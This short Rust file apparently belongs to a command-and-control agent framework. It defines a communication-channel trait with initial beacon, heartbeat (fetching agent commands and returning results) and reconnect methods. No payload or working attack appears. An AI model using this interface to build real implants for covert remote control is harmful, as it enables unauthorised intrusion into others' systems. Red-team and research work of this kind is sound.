use crate::{post::commands::AgentCommand, utils::logger::Logger};




#[async_trait::async_trait]
pub trait CommChannel: Send + Sync {    
    async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,) -> (u64, String);

    async fn heartbeat( 
        &self, agent_id: u64, session_id: &str, result: Option<Vec<String>>, logger: &Logger
    ) -> Option<Vec<AgentCommand>>;

    async fn reconnect(&self, agent_id: u64, session_id: &str, logger: &Logger,) -> (u64, String);
}